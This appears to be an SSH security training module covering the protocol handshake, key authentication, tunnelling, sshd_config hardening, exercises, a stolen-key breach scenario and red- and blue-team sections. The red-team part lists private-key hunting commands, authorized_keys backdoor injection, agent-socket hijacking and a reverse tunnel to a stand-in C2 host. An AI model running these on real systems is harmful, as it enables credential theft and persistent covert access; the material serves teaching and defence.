1. Theory Section
SSH handshake · key auth · tunnelling · sshd_config

What SSH is and why it replaced Telnet

SSH (Secure Shell) is a cryptographic protocol for operating services securely over an untrusted network. Before SSH, Telnet and rlogin sent everything — including passwords — in plaintext. Any network observer could capture credentials instantly. SSH encrypts the entire session, authenticates both parties, and provides a secure channel for shell access, file transfer, and port forwarding.

The SSH connection handshake

1
TCP connection: Client connects to server port 22. A standard TCP three-way handshake occurs first — SSH rides on top of TCP.
2
Version + algorithm negotiation: Client and server exchange supported SSH versions and algorithm lists — ciphers, MACs, key exchange methods.
3
Key exchange (Diffie-Hellman): Both sides generate a shared session key without ever transmitting it. This is the mathematical core — an eavesdropper on the network cannot derive the session key even if they capture every packet.
4
Server authentication: Server presents its host key. Client checks it against ~/.ssh/known_hosts. If the key is new, SSH asks you to confirm — TOFU (Trust On First Use). If a previously seen key changes, SSH warns loudly. A changed host key can indicate a MITM attack.
5
User authentication: Password or key-based. With key auth: the server challenges with data encrypted to the user's public key. The client decrypts it using the private key and returns proof — the private key never leaves the client machine.
6
Encrypted session: All further communication — commands, output, file transfers, port forwards — travels inside the encrypted tunnel.

Password auth vs key-based auth

Password auth
Simple but weak. Vulnerable to brute-force, credential stuffing, phishing. The password is transmitted (encrypted) to the server. Should be disabled on any production server.
Key-based auth
Private key never leaves your machine. Server stores only the public key. Immune to brute-force. The gold standard. Always protect the private key with a passphrase.

SSH key types — which to use

Ed25519
Modern, fastest, most secure. Recommended for all new keys — small size, strong security, widely supported.
RSA 4096-bit
Classic, universally compatible. Use 4096-bit minimum. 2048-bit is now considered marginal.
ECDSA
Elliptic curve — good but Ed25519 is preferred on all modern systems.
DSA
Deprecated. Never use. Insecure under certain RNG conditions.

SSH tunnelling — three types every security professional needs

Local port forwarding (-L) — access internal services from outside
ssh -L 8080:target-host:80 user@jumphost — traffic to your localhost:8080 travels encrypted through jumphost, then to target-host:80. Used to reach internal services through a bastion host.
Remote port forwarding (-R) — expose your local service on the remote server
ssh -R 9090:localhost:3000 user@remoteserver — traffic hitting remoteserver:9090 comes back to your localhost:3000. Used in pentesting to create reverse tunnels out from a compromised host — attacker reaches the target even after the initial session ends.
Dynamic SOCKS proxy (-D) — route all traffic through a pivot point
ssh -D 1080 user@jumphost -N — creates a SOCKS5 proxy. All traffic routed through it exits from jumphost's network. Configure proxychains to route any tool's traffic through the tunnel. The most powerful pivoting technique for internal network access.

Critical sshd_config settings

PermitRootLogin no
Never allow direct root SSH. Use a regular account + sudo. Attackers always try root first.
PasswordAuthentication no
Single most impactful hardening change. Disable passwords, force keys only.
PubkeyAuthentication yes
Confirm key auth works before disabling passwords or you lock yourself out.
AllowUsers alice bob
Whitelist only permitted users. Even a compromised account can't SSH in if not listed.
MaxAuthTries 3
Limit attempts per connection — slows brute-force significantly.
LoginGraceTime 30
Default 120s — lower to 30 to reduce auth window.
X11Forwarding no
Disable unless needed — reduces attack surface.
AllowTcpForwarding no
Disable tunnelling if your use case doesn't require it.

2. Practical Section
keygen · deploy · config · harden · scp · audit

Exercise 1 — generate SSH key pairs

ssh-keygen -t ed25519 -C "your@email.com" # generates ~/.ssh/id_ed25519 (private) and ~/.ssh/id_ed25519.pub (public) # ALWAYS set a passphrase when prompted — protect the private key ssh-keygen -t rsa -b 4096 -C "rsa-fallback" # RSA 4096-bit as universal fallback for older systems ls -la ~/.ssh/ # id_ed25519 must be 600, .pub files 644, .ssh dir 700 # Wrong permissions → SSH refuses to use the key cat ~/.ssh/id_ed25519.pub # view your public key — safe to share # NEVER share the file WITHOUT .pub extension

Exercise 2 — deploy keys to a server

ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server # copies public key to remote ~/.ssh/authorized_keys automatically # Manual method when ssh-copy-id unavailable: cat ~/.ssh/id_ed25519.pub | ssh user@server \ "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys" # Connect using specific key: ssh -i ~/.ssh/id_ed25519 user@server # Debug authentication issues: ssh -v user@server # verbose — shows each auth step ssh -vvv user@server # maximum verbosity

Exercise 3 — SSH client config file

cat > ~/.ssh/config << 'EOF' Host * ServerAliveInterval 60 ServerAliveCountMax 3 AddKeysToAgent yes Host myserver HostName 192.168.1.100 User alice Port 22 IdentityFile ~/.ssh/id_ed25519 Host internal-db HostName 10.0.0.50 User dbadmin ProxyJump myserver # jump through myserver to reach internal-db EOF chmod 600 ~/.ssh/config ssh myserver # connect with shorthand alias ssh internal-db # auto-jumps through myserver

Exercise 4 — audit and harden sshd_config

cat /etc/ssh/sshd_config # view full config grep -v "^#" /etc/ssh/sshd_config | grep -v "^$" # active settings only sudo sshd -T | grep -E "permitroot|passwordauth|pubkeyauth|maxauthtries" # dump all effective compiled settings — includes implicit defaults # Apply hardening (on a test VM — backup first): sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak sudo sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config sudo sed -i 's/#MaxAuthTries.*/MaxAuthTries 3/' /etc/ssh/sshd_config sudo sed -i 's/#LoginGraceTime.*/LoginGraceTime 30/' /etc/ssh/sshd_config sudo sshd -t # ALWAYS test syntax before reloading sudo systemctl reload sshd

Exercise 5 — SCP and SFTP for secure file transfer

scp file.txt user@server:/tmp/ # upload local → remote scp user@server:/etc/hostname ./ # download remote → local scp -r ~/security-lab/ user@server:/tmp/ # recursive directory upload scp -i ~/.ssh/id_ed25519 file.txt user@server:/tmp/ # explicit key sftp user@server # interactive SFTP session # sftp commands: ls, cd, get, put, mget, mput, pwd, bye

Exercise 6 — authorised keys audit

cat ~/.ssh/authorized_keys 2>/dev/null # who can log in as you? sudo cat /root/.ssh/authorized_keys 2>/dev/null # who can log in as root? for user in $(cut -d: -f1 /etc/passwd); do home=$(getent passwd $user | cut -d: -f6) ak="$home/.ssh/authorized_keys" if [[ -f "$ak" ]]; then echo "=== $user ===" cat "$ak" fi done # lists every authorized key on the system — run this during any incident

Exercise 7 — SSH tunnelling practice

# Local forward — access remote port 8080 locally on port 9000: ssh -L 9000:localhost:8080 user@server -N & curl http://localhost:9000 # traffic goes encrypted through server # Dynamic SOCKS proxy on port 1080: ssh -D 1080 user@server -N & curl --proxy socks5://localhost:1080 https://example.com # Kill background tunnel: kill %1 # kill most recent background job
3. Real-World Scenario
Stolen SSH key pivots through 6 corporate servers

A developer's laptop is compromised via a phishing email. The attacker finds ~/.ssh/id_rsa with no passphrase. The key authorises access to the corporate bastion host.

Step 1 — key discovery and initial access

The attacker reads ~/.ssh/config — it reveals the bastion hostname and username. They copy the private key and connect immediately. No brute-force, no vulnerability — just a stolen key that works instantly.

Step 2 — lateral movement via key reuse

From the bastion they check ~/.ssh/known_hosts — it lists 6 internal servers. The same private key is in authorized_keys on every one of them because the developer reused it everywhere. They SSH to all six silently.

Step 3 — persistent reverse tunnel

On the internal database server they run: ssh -R 2222:localhost:22 attacker@c2-server -N -f. This creates a reverse tunnel — the attacker can now SSH back into the internal network through port 2222 on their C2 server at any time, even after the laptop access is revoked.

Step 4 — backdoor key injection

On each compromised server they append their own public key to ~/.ssh/authorized_keys. Even after the stolen developer key is rotated, the attacker's key remains — persistent access survives the incident response.

Defender lessons

Always use passphrases on private keys. Never reuse keys across servers. Audit authorized_keys on all servers immediately when a breach is suspected. Monitor authorized_keys with auditd for any writes. Rotate all keys on any compromised machine.

4. Red Team Perspective
SSH key hunting · pivoting · authorized_keys persistence

SSH key hunting after foothold

find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null find / -name "*.pem" -o -name "*.key" 2>/dev/null | grep -v "/etc/ssl" find /home /root -name "known_hosts" 2>/dev/null # reveals other hosts find /home /root -name "config" -path "*/.ssh/*" 2>/dev/null # SSH client configs cat ~/.bash_history | grep -E "ssh |scp |sftp " # recent SSH usage

known_hosts as a network map

The known_hosts file is a complete inventory of every server this user has connected to. Each entry is a target for lateral movement.

cat ~/.ssh/known_hosts # all known servers cat /root/.ssh/known_hosts # root's connections (more sensitive) grep -h "" /home/*/.ssh/known_hosts 2>/dev/null | cut -d' ' -f1 | sort -u # all unique hostnames and IPs across all users

Persistence via authorized_keys injection

ssh-keygen -t ed25519 -f /tmp/attacker_key -N "" cat /tmp/attacker_key.pub echo "ssh-ed25519 AAAA...attacker_key" >> ~/.ssh/authorized_keys echo "ssh-ed25519 AAAA...attacker_key" >> /root/.ssh/authorized_keys ssh -i /tmp/attacker_key user@target # silent future access

Reverse SSH tunnel for persistent C2 access

ssh -R 2222:localhost:22 attacker@c2.example.com -N -f # -f background, -N no command — invisible on process list # From attacker C2: ssh -p 2222 user@localhost # connects back to compromised host

Credential extraction from SSH agent

echo $SSH_AUTH_SOCK # is an agent running? ssh-add -l # list loaded keys in agent # If agent forwarding is enabled on the jump host, # the agent socket from the original user is accessible SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.PID ssh-add -l
5. Blue Team Perspective
Harden SSH · audit keys · fail2ban · monitor logins

Complete SSH hardening checklist

sudo sshd -T | grep -E "^permitrootlogin|^passwordauthentication|^pubkeyauthentication|^maxauthtries|^logingracetime|^allowusers" # view all effective SSH settings — verify every production server
  • PermitRootLogin no — never direct root login
  • PasswordAuthentication no — keys only on any production system
  • MaxAuthTries 3 — limit attempts per connection
  • LoginGraceTime 30 — reduce auth window from 120s
  • AllowUsers alice bob — explicit whitelist of permitted accounts
  • X11Forwarding no — disable unless explicitly needed
  • AllowTcpForwarding no — disable tunnelling if not required

Install and configure fail2ban for SSH

sudo apt install fail2ban -y sudo tee /etc/fail2ban/jail.local << 'EOF' [sshd] enabled = true maxretry = 5 findtime = 600 bantime = 3600 EOF sudo systemctl enable --now fail2ban sudo fail2ban-client status sshd # current bans sudo fail2ban-client set sshd unbanip [IP] # manually unban an IP

Monitor SSH activity in real time

tail -f /var/log/auth.log | grep --line-buffered sshd grep "Accepted publickey" /var/log/auth.log # successful key logins grep "Accepted password" /var/log/auth.log # password logins (red flag if disabled) grep "Invalid user" /var/log/auth.log | awk '{print $8}' | sort | uniq -c | sort -rn # top usernames targeted by brute-force — reveals attacker wordlist

Audit authorized_keys and monitor for changes

auditctl -w /root/.ssh/authorized_keys -p wa -k root_key_changes auditctl -w /home/ -p wa -k user_key_changes ausearch -k root_key_changes # any writes to root's authorized_keys? find /home /root -name "authorized_keys" -newer /etc/passwd 2>/dev/null # authorized_keys modified more recently than /etc/passwd — investigate

Add SSH audit to recon.sh

banner "SSH AUDIT" echo "--- sshd key settings ---" sudo sshd -T 2>/dev/null | grep -E "^permitroot|^passwordauth|^maxauthtries" echo "--- all authorized_keys files ---" find /home /root -name "authorized_keys" 2>/dev/null | while read f; do echo "[$f]"; cat "$f" done echo "--- recent successful SSH logins ---" grep "Accepted" /var/log/auth.log 2>/dev/null | tail -10

10. Pro Tips & Mindset
SSH habits that separate beginners from professionals

Use an SSH agent. Running eval $(ssh-agent) && ssh-add ~/.ssh/id_ed25519 loads your passphrase-protected key into memory — you type the passphrase once per session, not on every connection. This removes the last excuse for not using a passphrase. On macOS and most desktop Linux distros the agent starts automatically.

Maintain ~/.ssh/config rigorously. It saves typing, enforces correct key selection, documents your access inventory, and makes ProxyJump through bastion hosts trivially easy. A well-managed config file is genuinely one of the most practical productivity improvements in daily security work.

Before applying PasswordAuthentication no to a production server, open a second SSH session in a separate terminal and verify key-based auth works in that session before closing the first. The number of engineers who have locked themselves out of production servers doing this wrong is enormous. Test in a live second session, then apply.

Never commit an SSH private key to a git repository. Not even a "test" key. Git history is permanent and public repos are indexed by automated scanners within minutes of a push. If you accidentally commit one, assume it is already compromised — rotate it immediately, then remove it from git history using BFG Repo Cleaner or git filter-repo.

Changing SSH port from 22 reduces bot traffic but is not a security control. A port scan finds the new port in seconds. Never rely on a non-default port as a primary security measure — it is noise reduction at best. Real security is key-based auth, fail2ban, and AllowUsers restrictions.

Pro mindset: treat SSH keys exactly like physical keys to a building. You wouldn't make one master key that opens every door and leave a copy lying around. Each server gets a unique key. Each key has a passphrase. The authorized_keys file on each server is reviewed quarterly. This operational discipline is what protects real infrastructure — and it's the same discipline you apply starting today.
